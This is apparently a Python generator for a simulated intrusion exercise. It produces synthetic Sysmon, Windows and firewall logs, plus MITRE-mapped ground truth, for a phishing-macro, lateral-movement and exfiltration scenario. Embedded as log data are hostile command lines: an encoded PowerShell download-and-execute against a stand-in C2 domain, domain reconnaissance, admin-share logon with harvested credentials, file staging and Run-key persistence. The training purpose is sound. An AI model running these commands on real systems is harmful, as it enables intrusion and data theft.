"""
Scenario object construction: turns a selected template + environment into a
concrete, fully-identified attack chain. This is the single authoritative
source of truth -- dataset/, solution/WALKTHROUGH.md and
solution/ground_truth.json all derive from the object returned here.
"""

import datetime
import uuid

from scenario import mitre
from scenario.identity import make_process_guid, make_logon_id, format_time
from scenario.environment import host_by_name, workstation_hosts
from generators import sysmon, win_security, win_system, powershell, fortigate

DOCM_NAMES = ["Q3_Invoice_Review.docm", "Vendor_Statement_Update.docm", "Signed_PO_48213.docm"]
STAGE_DIR_NAMES = ["~upd8213", "WinCacheTmp", "svc_stage"]
ARCHIVE_NAMES = ["backup_1099.zip", "sys_diag.zip", "update_cache.zip"]
C2_DOMAINS = ["cdn-update-delivery.net", "api-telemetry-sync.com", "static-assets-cache.net"]
COLLECTION_FILES = [
    "Q2_Financials.xlsx", "Payroll_Master_2026.xlsx", "Vendor_Contracts.pdf",
    "Board_Minutes_June.docx", "Customer_Export.csv", "AP_Ledger.xlsx",
    "HR_Compensation_Bands.xlsx", "Bank_Wire_Instructions.docx",
    "M&A_NDA_Draft.docx", "Insurance_Claims_Q2.xlsx", "Tax_Filing_2025.pdf",
    "Audit_Findings_Internal.docx", "Client_PII_Export.csv", "Budget_FY27_Draft.xlsx",
]


class AttackBuilder:
    def __init__(self, seed, environment, rng, day_start, tz, seq_counters):
        self.seed = seed
        self.env = environment
        self.rng = rng
        self.tz = tz
        self.t = day_start
        self.attack_events = []
        self.timeline_steps = []
        self.seq_counters = seq_counters
        self.machine_guids = environment["machine_guids"]

    def advance(self, min_s, max_s):
        self.t = self.t + datetime.timedelta(seconds=self.rng.randint(min_s, max_s))
        return self.t

    def guid(self, host, t=None):
        t = t or self.t
        return make_process_guid(self.machine_guids[host], t, self.seq_counters.next(host))

    def logon_id(self):
        return make_logon_id(self.rng)

    def emit(self, source, record):
        self.attack_events.append((source, self.t, record))
        return record

    def step(self, stage, technique_id, host, account, narrative, pivot, evidence):
        entry = {
            "stage": stage,
            "technique": mitre.lookup(technique_id),
            "time": format_time(self.t),
            "host": host,
            "account": account,
            "narrative": narrative,
            "pivot": pivot,
            "evidence": evidence,
        }
        self.timeline_steps.append(entry)
        return entry

    def process(self, host, computer_name, image, description, product, company,
                original_filename, command_line, current_dir, user, parent_guid,
                parent_pid, parent_image, parent_cmdline, integrity="Medium",
                logon_id=None, security_event=True):
        pguid = self.guid(host)
        pid = self.rng.randint(1200, 38000)
        lguid = self.guid(host)
        lid = logon_id or self.logon_id()
        rec = sysmon.process_create(
            self.seed, self.t, host, computer_name, pguid, pid, image, description,
            product, company, original_filename, command_line, current_dir, user,
            lguid, lid, integrity, parent_guid, parent_pid, parent_image, parent_cmdline,
        )
        self.emit("sysmon", rec)
        if security_event:
            sec = win_security.process_creation_4688(
                self.t, host, computer_name, user, lid, image, pid, command_line, parent_image,
            )
            self.emit("windows_security", sec)
        return pguid, pid, lid

    def netconn(self, host, computer_name, pguid, pid, image, user, dst_ip, dst_port,
                dst_hostname=None, proto="tcp"):
        rec = sysmon.network_connect(
            self.t, host, computer_name, pguid, pid, image, user, proto,
            host_by_name(self.env, host)["ip"], self.rng.randint(49152, 65000),
            dst_ip, dst_port, dst_hostname,
        )
        self.emit("sysmon", rec)
        return rec

    def dns(self, host, computer_name, pguid, pid, image, query_name, results, user):
        rec = sysmon.dns_query(self.t, host, computer_name, pguid, pid, image, query_name, results, user)
        self.emit("sysmon", rec)
        return rec

    def filecreate(self, host, computer_name, pguid, pid, image, path, user):
        rec = sysmon.file_create(self.t, host, computer_name, pguid, pid, image, path, user)
        self.emit("sysmon", rec)
        return rec

    def regset(self, host, computer_name, pguid, pid, image, target_object, details, user):
        rec = sysmon.registry_set(self.t, host, computer_name, pguid, pid, image, target_object, details, user)
        self.emit("sysmon", rec)
        return rec

    def fortigate_line(self, srcip, srcport, dstip, dstport, service, app, appcat,
                        sentbyte, rcvdbyte, duration=5, sessionid=None, action="accept",
                        srcintf="internal", dstintf="wan1"):
        sessionid = sessionid or self.rng.randint(20_000_000, 29_000_000)
        line = fortigate.traffic_log(
            self.t, srcip, srcport, srcintf, dstip, dstport, dstintf, sessionid,
            "tcp", action, self.rng.randint(1, 5), service, app, appcat, "Reserved",
            "Israel", duration, sentbyte, rcvdbyte, max(1, sentbyte // 400), max(1, rcvdbyte // 800),
        )
        self.emit("fortigate", line)
        return line


def _recon_commands(b, host, computer_name, user, parent_guid, parent_pid, parent_image, parent_cmdline, lid):
    commands = [
        ("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c whoami /all", "T1082"),
        ("C:\\Windows\\System32\\systeminfo.exe", "systeminfo.exe", "T1082"),
        ("C:\\Windows\\System32\\ipconfig.exe", "ipconfig.exe /all", "T1082"),
        ("C:\\Windows\\System32\\net.exe", 'net.exe user /domain', "T1087.002"),
        ("C:\\Windows\\System32\\net.exe", 'net.exe group "Domain Admins" /domain', "T1087.002"),
        ("C:\\Windows\\System32\\nltest.exe", "nltest.exe /dclist:" + b.env["domain"], "T1018"),
        ("C:\\Windows\\System32\\net.exe", 'net.exe view \\\\FS01', "T1018"),
        ("C:\\Windows\\System32\\tasklist.exe", "tasklist.exe /v", "T1082"),
    ]
    events = []
    for image, cmdline, tid in commands:
        b.advance(30, 240)
        desc = image.split("\\")[-1]
        pguid, pid, _ = b.process(
            host, computer_name, image, desc, desc, "Microsoft Corporation", desc,
            cmdline, "C:\\Windows\\System32\\", user, parent_guid, parent_pid, parent_image,
            parent_cmdline, logon_id=lid,
        )
        events.append((tid, pguid, pid, image, cmdline))
    return events


def _beacon_series(b, host, computer_name, pguid, pid, image, user, dst_ip, dst_port,
                    dst_hostname, count):
    lines = []
    for i in range(count):
        b.advance(240, 540)
        b.netconn(host, computer_name, pguid, pid, image, user, dst_ip, dst_port, dst_hostname)
        sent = b.rng.randint(400, 2200)
        rcvd = b.rng.randint(600, 4800)
        b.fortigate_line(host_by_name(b.env, host)["ip"], b.rng.randint(49152, 65000),
                          dst_ip, dst_port, "https", "HTTPS", "web-browsing", sent, rcvd, duration=b.rng.randint(1, 8))
        lines.append(i)
    return lines


def _stage_and_archive(b, host, computer_name, user, parent_guid, parent_pid, parent_image,
                        parent_cmdline, stage_dir, archive_name, lid, n_files):
    files = list(COLLECTION_FILES)
    b.rng.shuffle(files)
    files = files[:n_files]
    robo_cmd = 'robocopy.exe \\\\FS01\\Finance$ C:\\Windows\\Temp\\{} /E /NFL'.format(stage_dir)
    b.advance(20, 90)
    rguid, rpid, _ = b.process(
        host, computer_name, "C:\\Windows\\System32\\Robocopy.exe", "Robocopy Utility",
        "Microsoft(R) Windows(R) Operating System", "Microsoft Corporation", "ROBOCOPY.EXE",
        robo_cmd, "C:\\Windows\\Temp\\", user, parent_guid, parent_pid, parent_image, parent_cmdline,
        logon_id=lid,
    )
    for fname in files:
        b.advance(5, 25)
        b.filecreate(host, computer_name, rguid, rpid, "C:\\Windows\\System32\\Robocopy.exe",
                     "C:\\Windows\\Temp\\{}\\{}".format(stage_dir, fname), user)

    b.advance(60, 180)
    archive_cmd = 'powershell.exe -nop -c "Compress-Archive -Path C:\\Windows\\Temp\\{} -DestinationPath C:\\Windows\\Temp\\{}"'.format(
        stage_dir, archive_name)
    aguid, apid, _ = b.process(
        host, computer_name, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "Windows PowerShell", "Microsoft(R) Windows(R) Operating System", "Microsoft Corporation",
        "POWERSHELL.EXE", archive_cmd, "C:\\Windows\\Temp\\", user, parent_guid, parent_pid,
        parent_image, parent_cmdline, logon_id=lid,
    )
    b.advance(5, 15)
    b.filecreate(host, computer_name, aguid, apid, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                 "C:\\Windows\\Temp\\{}".format(archive_name), user)
    return aguid, apid, files


def _build_phishing_macro_lateral_smb(b, victim_host, victim_user, admin_user):
    domain = b.env["domain"]
    domain_short = domain.split(".")[0].upper()
    fs = host_by_name(b.env, "FS01")
    infra_ip = fortigate.attacker_infra_ip(b.rng)
    c2_domain = b.rng.choice(C2_DOMAINS)
    docm = b.rng.choice(DOCM_NAMES)
    stage_dir = b.rng.choice(STAGE_DIR_NAMES)
    archive_name = b.rng.choice(ARCHIVE_NAMES)

    vh = victim_host["hostname"]
    vfqdn = victim_host["fqdn"]
    vuser_full = "{}\\{}".format(domain_short, victim_user)

    outlook_guid, outlook_pid, _ = b.process(
        vh, vfqdn, "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "Microsoft Outlook",
        "Microsoft Office", "Microsoft Corporation", "OUTLOOK.EXE", '"OUTLOOK.EXE"',
        "C:\\Users\\{}\\".format(victim_user), vuser_full, "{00000000-0000-0000-0000-000000000000}", 4,
        "C:\\Windows\\explorer.exe", "explorer.exe",
    )
    attach_path = "C:\\Users\\{}\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\{}\\{}".format(
        victim_user, uuid.UUID(int=b.rng.getrandbits(128)).hex[:8].upper(), docm)
    b.filecreate(vh, vfqdn, outlook_guid, outlook_pid, "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
                 attach_path, vuser_full)
    b.step("initial_access", "T1566.001", vh, victim_user,
           "{} receives and saves an email attachment ({}) to the Outlook secure temp cache.".format(victim_user, docm),
           "attachment path -> WINWORD.EXE child process", {"source": "sysmon", "EventCode": 11, "TargetFilename": attach_path})

    b.advance(30, 180)
    word_guid, word_pid, word_lid = b.process(
        vh, vfqdn, "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "Microsoft Word",
        "Microsoft Office", "Microsoft Corporation", "WINWORD.EXE", '"WINWORD.EXE" /n "{}"'.format(attach_path),
        "C:\\Users\\{}\\Downloads\\".format(victim_user), vuser_full, outlook_guid, outlook_pid,
        "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "OUTLOOK.EXE",
    )
    b.step("execution", "T1204.002", vh, victim_user,
           "{} opens the attachment; Word renders it with macros enabled.".format(docm),
           "WINWORD.EXE ProcessGuid -> child powershell.exe", {"source": "sysmon", "EventCode": 1, "Image": "WINWORD.EXE"})

    b.advance(15, 60)
    enc_cmd = 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwB1AHAAZABhAHQAZQAuAC8AJwApAA=='
    ps_guid, ps_pid, ps_lid = b.process(
        vh, vfqdn, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "Windows PowerShell",
        "Microsoft(R) Windows(R) Operating System", "Microsoft Corporation", "POWERSHELL.EXE", enc_cmd,
        "C:\\Users\\{}\\".format(victim_user), vuser_full, word_guid, word_pid,
        "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "WINWORD.EXE", integrity="Medium",
    )
    b.step("execution", "T1059.005", vh, victim_user,
           "The macro (VBA, not independently logged) invokes powershell.exe as its child process.",
           "powershell.exe ProcessGuid", {"source": "sysmon", "EventCode": 1, "ParentImage": "WINWORD.EXE", "Image": "powershell.exe"})

    sbid = str(uuid.UUID(int=b.rng.getrandbits(128)))
    sb = powershell.script_block_4104(
        b.t, vh, vfqdn, "IEX (New-Object Net.WebClient).DownloadString('https://{}/update.'); Start-Sleep -Seconds 2".format(c2_domain),
        sbid, "-", vuser_full,
    )
    b.emit("powershell", sb)
    b.step("execution", "T1059.001", vh, victim_user,
           "Decoded script block shows a download-and-execute against {}.".format(c2_domain),
           "ScriptBlockText domain -> DNS query -> network connection", {"source": "powershell", "EventCode": 4104, "ScriptBlockId": sbid})

    b.advance(5, 20)
    b.dns(vh, vfqdn, ps_guid, ps_pid, "powershell.exe", c2_domain, infra_ip, vuser_full)
    b.advance(2, 10)
    b.netconn(vh, vfqdn, ps_guid, ps_pid, "powershell.exe", vuser_full, infra_ip, 443, c2_domain)
    b.fortigate_line(victim_host["ip"], b.rng.randint(49152, 65000), infra_ip, 443, "https", "HTTPS", "web-browsing",
                      b.rng.randint(1800, 4200), b.rng.randint(3000, 9000), duration=4)

    beacon_count = b.rng.randint(28, 42)
    _beacon_series(b, vh, vfqdn, ps_guid, ps_pid, "powershell.exe", vuser_full, infra_ip, 443, c2_domain, beacon_count)
    b.step("execution", "T1071.001", vh, victim_user,
           "powershell.exe repeatedly reconnects to {} ({}) over HTTPS -- {} beacon-interval connections.".format(c2_domain, infra_ip, beacon_count),
           "count of connections to {} over time -> beacon pattern".format(infra_ip),
           {"source": "sysmon", "EventCode": 3, "DestinationIp": infra_ip})

    b.advance(60, 200)
    payload_path = "C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\WindowsUpdateHelper.exe".format(victim_user)
    b.filecreate(vh, vfqdn, ps_guid, ps_pid, "powershell.exe", payload_path, vuser_full)
    run_key = "HKU\\{}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdateHelper".format(victim_user)
    b.regset(vh, vfqdn, ps_guid, ps_pid, "powershell.exe", run_key, payload_path, vuser_full)
    b.step("persistence", "T1547.001", vh, victim_user,
           "A Run-key value 'WindowsUpdateHelper' is created pointing at a dropped executable in AppData.",
           "TargetObject Run-key name -> reappears on every logon", {"source": "sysmon", "EventCode": 13, "TargetObject": run_key})

    b.advance(120, 400)
    recon = _recon_commands(b, vh, vfqdn, vuser_full, ps_guid, ps_pid, "powershell.exe", enc_cmd, ps_lid)
    b.step("discovery", "T1082", vh, victim_user,
           "Local system, network config and process enumeration via cmd.exe/systeminfo/tasklist children of powershell.exe.",
           "children of the same ParentProcessGuid", {"source": "sysmon", "EventCode": 1, "ParentImage": "powershell.exe"})
    b.step("discovery", "T1087.002", vh, victim_user,
           "'net user /domain' and 'net group \"Domain Admins\" /domain' enumerate domain accounts.",
           "TargetUserName candidates for lateral movement", {"source": "sysmon", "EventCode": 1, "CommandLine": "net.exe user /domain"})
    b.step("discovery", "T1018", vh, victim_user,
           "'nltest /dclist' and 'net view \\\\FS01' enumerate reachable domain systems.",
           "FS01 identified as next-hop target", {"source": "sysmon", "EventCode": 1, "CommandLine": "net.exe view \\\\FS01"})

    b.advance(180, 600)
    net_use_cmd = 'net.exe use \\\\FS01\\ADMIN$ /user:{}\\{} *'.format(domain_short, admin_user)
    net_guid, net_pid, _ = b.process(
        vh, vfqdn, "C:\\Windows\\System32\\net.exe", "Net Command", "Microsoft(R) Windows(R) Operating System",
        "Microsoft Corporation", "NET.EXE", net_use_cmd, "C:\\Users\\{}\\".format(victim_user), vuser_full,
        ps_guid, ps_pid, "powershell.exe", enc_cmd, logon_id=ps_lid,
    )
    b.step("credential_use", "T1078.002", vh, admin_user,
           "'{}' explicitly supplies a previously-harvested domain account ({}) rather than the victim's own credentials.".format(net_use_cmd, admin_user),
           "TargetUserName={} carries into the lateral-movement logon".format(admin_user),
           {"source": "sysmon", "EventCode": 1, "CommandLine": "net.exe use"})
    expl = win_security.explicit_creds(b.t, vh, vfqdn, vuser_full, admin_user, domain_short, "FS01", "net.exe")
    b.emit("windows_security", expl)

    b.advance(5, 30)
    lm_lid = b.logon_id()
    logon4624 = win_security.logon_success(
        b.t, "FS01", fs["fqdn"], admin_user, domain_short, lm_lid, win_security.LOGON_TYPE_NETWORK,
        "NtLmSsp", "NTLM", vh, victim_host["ip"], b.rng.randint(49152, 65000),
    )
    b.emit("windows_security", logon4624)
    priv = win_security.special_privileges(b.t, "FS01", fs["fqdn"], admin_user, domain_short, lm_lid)
    b.emit("windows_security", priv)
    b.netconn(vh, vfqdn, net_guid, net_pid, "net.exe", vuser_full, fs["ip"], 445, "FS01")
    b.step("lateral_movement", "T1021.002", "FS01", admin_user,
           "A Type 3 (network) logon for {} lands on FS01 from {} ({}).".format(admin_user, vh, victim_host["ip"]),
           "TargetLogonId {} ties subsequent FS01 process activity to this session".format(lm_lid),
           {"source": "windows_security", "EventCode": 4624, "LogonType": 3, "IpAddress": victim_host["ip"]})

    b.advance(1, 5)
    share_evt = win_security.share_access_5140(
        b.t, "FS01", fs["fqdn"], admin_user, domain_short, lm_lid, victim_host["ip"],
        b.rng.randint(49152, 65000), "\\\\FS01\\ADMIN$", "C:\\Windows",
    )
    b.emit("windows_security", share_evt)
    b.step("lateral_movement", "T1021.002", "FS01", admin_user,
           "The same session immediately accesses the ADMIN$ administrative share on FS01 -- the delivery path for the payload dropped moments later.",
           "ShareName=\\\\FS01\\ADMIN$ confirms admin-share access, closing the delivery-path gap",
           {"source": "windows_security", "EventCode": 5140, "ShareName": "\\\\FS01\\ADMIN$"})

    b.advance(10, 60)
    svc_name = "WindowsUpdateSvc"
    svc7045 = win_system.service_installed_7045(
        b.t, "FS01", fs["fqdn"], svc_name, "C:\\Windows\\Temp\\wuhelper.exe", "user mode service", "demand start", admin_user,
    )
    b.emit("windows_system", svc7045)
    root_sentinel = "{00000000-0000-0000-0000-000000000000}"
    # services.exe itself starts at boot, long before this capture window, so
    # it (like explorer.exe elsewhere) is treated as an unlogged system root.
    services_guid = b.guid("FS01")
    services_pid = 604
    b.filecreate("FS01", fs["fqdn"], services_guid, services_pid, "C:\\Windows\\System32\\services.exe",
                 "C:\\Windows\\Temp\\wuhelper.exe", admin_user)
    cmd_guid, cmd_pid, _ = b.process(
        "FS01", fs["fqdn"], "C:\\Windows\\System32\\cmd.exe", "Windows Command Processor",
        "Microsoft(R) Windows(R) Operating System", "Microsoft Corporation", "CMD.EXE",
        'cmd.exe /c whoami && net localgroup administrators', "C:\\Windows\\Temp\\", admin_user,
        root_sentinel, services_pid, "C:\\Windows\\System32\\services.exe", "services.exe", logon_id=lm_lid,
    )
    b.step("lateral_movement", "T1021.002", "FS01", admin_user,
           "A short-lived service ('{}') is installed on FS01 to execute commands with SYSTEM-equivalent rights.".format(svc_name),
           "ServiceName -> child cmd.exe on FS01", {"source": "windows_system", "EventCode": 7045, "ServiceName": svc_name})

    b.advance(60, 240)
    n_files = b.rng.randint(9, 14)
    aguid, apid, staged_files = _stage_and_archive(
        b, "FS01", fs["fqdn"], admin_user, cmd_guid, cmd_pid, "C:\\Windows\\System32\\cmd.exe",
        'cmd.exe /c whoami && net localgroup administrators', stage_dir, archive_name, lm_lid, n_files,
    )
    b.step("collection", "T1005", "FS01", admin_user,
           "robocopy mirrors {} files from \\\\FS01\\Finance$ into a Windows\\Temp staging directory.".format(n_files),
           "staged filenames -> archive TargetFilename", {"source": "sysmon", "EventCode": 11, "TargetFilename": "C:\\Windows\\Temp\\{}\\...".format(stage_dir)})
    b.step("staging", "T1074.001", "FS01", admin_user,
           "Collected files sit under C:\\Windows\\Temp\\{} pending archival.".format(stage_dir),
           "stage_dir -> archive name", {"source": "sysmon", "EventCode": 11})
    b.step("staging", "T1560.001", "FS01", admin_user,
           "Compress-Archive builds {} from the staged directory.".format(archive_name),
           "archive filename -> outbound transfer size", {"source": "sysmon", "EventCode": 1, "CommandLine": "Compress-Archive"})

    b.advance(60, 300)
    exfil_bytes = b.rng.randint(35_000_000, 95_000_000)
    b.netconn("FS01", fs["fqdn"], aguid, apid, "powershell.exe", admin_user, infra_ip, 443, c2_domain)
    b.fortigate_line(fs["ip"], b.rng.randint(49152, 65000), infra_ip, 443, "https", "HTTPS", "web-browsing",
                      exfil_bytes, b.rng.randint(2000, 8000), duration=b.rng.randint(30, 120))
    b.step("exfiltration", "T1041", "FS01", admin_user,
           "The archive is uploaded to {} over the same HTTPS channel used for C2 -- a single large-sentbyte session (~{} MB).".format(infra_ip, exfil_bytes // 1_000_000),
           "sentbyte outlier on FortiGate session to {}".format(infra_ip),
           {"source": "fortigate", "dstip": infra_ip, "sentbyte": exfil_bytes})

    b.advance(30, 90)
    b.emit("windows_security", win_security.token_logoff(b.t, "FS01", fs["fqdn"], admin_user, domain_short, lm_lid))
    b.emit("windows_security", win_security.logoff(b.t, "FS01", fs["fqdn"], admin_user, domain_short, lm_lid))

    affected_hosts = [vh, "FS01"]
    affected_accounts = [victim_user, admin_user]
    attacker_infra = {"ip": infra_ip, "domain": c2_domain, "protocol": "https", "port": 443}
    generated_event_ids = {
        "initial_workstation_process_guid": word_guid,
        "powershell_process_guid": ps_guid,
        "powershell_logon_id": ps_lid,
        "lateral_movement_logon_id": lm_lid,
        "fs01_service_name": svc_name,
        "staged_files": staged_files,
        "archive_name": archive_name,
        "stage_dir": stage_dir,
    }
    return vh, victim_user, affected_hosts, affected_accounts, attacker_infra, generated_event_ids




_BUILDERS = {
    "phishing_macro_lateral_smb": _build_phishing_macro_lateral_smb,
}


def build_scenario(template, environment, rng_scenario, seed, window_start, window_end, tz_name, attack_day_index, seq_counters):
    day_start_local = window_start + datetime.timedelta(days=attack_day_index)
    start_hour = rng_scenario.randint(9, 15)
    start_minute = rng_scenario.choice([0, 5, 10, 15, 20, 25, 30, 35, 40])
    attack_start = day_start_local.replace(hour=start_hour, minute=start_minute, second=rng_scenario.randint(0, 59), microsecond=0)

    ws_hosts = workstation_hosts(environment)
    victim_host = rng_scenario.choice(ws_hosts)
    victim_user = victim_host["primary_user"]
    admin_candidates = [u["username"] for u in environment["users"] if u["is_admin"]]
    admin_user = rng_scenario.choice(admin_candidates)

    b = AttackBuilder(seed, environment, rng_scenario, attack_start, tz_name, seq_counters)
    builder_fn = _BUILDERS[template["id"]]
    initial_host, initial_user, affected_hosts, affected_accounts, attacker_infra, generated_event_ids = builder_fn(
        b, victim_host, victim_user, admin_user,
    )
    attack_end = b.t

    mitre_mappings = []
    for step in b.timeline_steps:
        mitre_mappings.append({
            "id": step["technique"]["id"],
            "name": step["technique"]["name"],
            "url": step["technique"]["url"],
            "stage": step["stage"],
            "evidence": step["narrative"],
        })

    expected_telemetry = {}
    for source, t, rec in b.attack_events:
        expected_telemetry[source] = expected_telemetry.get(source, 0) + 1

    scenario = {
        "scenario_template": template["id"],
        "scenario_name": template["name"],
        "scenario_summary": template["summary"],
        "seed": seed,
        "time_window": {
            "start": format_time(window_start), "end": format_time(window_end), "timezone": tz_name,
        },
        "attack_start_time": format_time(attack_start),
        "attack_end_time": format_time(attack_end),
        "organization": environment["org_name"],
        "domain": environment["domain"],
        "network_map": environment["hosts"],
        "affected_hosts": affected_hosts,
        "affected_accounts": affected_accounts,
        "attacker_infrastructure": attacker_infra,
        "initial_access_host": initial_host,
        "initial_access_user": initial_user,
        "attack_timeline": b.timeline_steps,
        "expected_telemetry": expected_telemetry,
        "generated_event_ids": generated_event_ids,
        "mitre_mappings": mitre_mappings,
        "total_attack_events": len(b.attack_events),
    }
    return scenario, b.attack_events
